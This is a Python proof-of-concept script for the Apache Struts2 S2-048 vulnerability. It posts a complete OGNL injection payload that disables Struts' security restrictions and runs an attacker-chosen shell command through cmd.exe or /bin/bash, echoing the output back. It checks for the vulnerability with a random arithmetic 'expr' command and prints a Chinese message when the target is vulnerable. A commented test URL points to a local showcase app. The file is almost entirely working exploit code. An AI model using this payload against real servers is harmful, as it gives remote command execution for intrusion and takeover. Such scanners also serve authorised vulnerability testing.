import warnings
import requests
import random
warnings.filterwarnings("ignore")



def poc(url):
    timeout = 10
    proxies = {'http': '127.0.0.1:9999'}

    ran_a = random.randint(10000000, 20000000)
    ran_b = random.randint(1000000, 2000000)
    ran_check = ran_a - ran_b
    check = [ran_check]
    lin = 'expr' + ' ' + str(ran_a) + ' - ' + str(ran_b)
    data_048 = {
        "name": r"%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=#parameters.cmd[0]).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
        "cmd": lin,
        "age": 111,
        "bustedBefore": "true",
        "__checkbox_bustedBefore": "true",
        "description": 111,
    }
    headers_048 = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        req = requests.post(url, data=data_048, headers=headers_048, timeout=timeout, verify=False,)
        result = "目标存在 Struts2-048, check url: %s" % url
        for c in check:
            if str(c) in req.text:
                print(str(c))
                return result
    except:
        pass

# test_url ='http://127.0.0.1:8080/struts2-showcase/integration/saveGangster.action'
